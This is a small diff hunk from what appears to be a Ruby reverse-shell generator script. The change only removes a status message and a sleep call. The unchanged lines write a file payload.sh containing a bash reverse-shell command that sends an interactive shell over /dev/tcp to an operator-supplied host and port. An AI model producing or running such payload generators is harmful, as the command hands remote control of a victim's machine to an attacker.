@@ -40,8 +40,6 @@ port = options.local_port
 shell = options.target_shell
 
 sleep(0.5)
-puts "#{g}Writing payload..."
-sleep(1)
 open('payload.sh', 'w') { |f|
     f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
 }
